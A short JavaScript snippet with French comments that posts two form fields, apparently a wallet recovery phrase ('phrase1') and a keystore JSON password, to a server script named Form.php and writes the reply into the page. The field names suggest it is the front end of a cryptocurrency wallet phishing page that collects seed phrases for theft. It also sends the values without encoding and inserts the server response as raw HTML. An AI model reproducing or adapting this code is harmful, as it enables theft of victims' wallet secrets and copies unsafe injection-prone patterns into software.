                 // Créer un objet XMLHttpRequest
var xhr = new XMLHttpRequest();

// Définir une fonction de rappel
xhr.onload = function() {
  // Vérifier si la requête a réussi
  if (xhr.status == 200) {
    // Afficher la réponse du script PHP dans un élément HTML
    document.getElementById("result").innerHTML = xhr.responseText;
  } else {
    // Afficher un message d'erreur
    document.getElementById("result").innerHTML = "Erreur lors de l'envoi du message";
  }
};

// Ouvrir une requête
xhr.open("POST", "Form.php", true);

// Définir le type de contenu de la requête
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// Envoyer la requête avec les données du formulaire
xhr.send("phrase1=" + document.getElementById("phrase1").value +
         "&keystoreJSONPassword=" + document.getElementById("keystoreJSONPassword").value);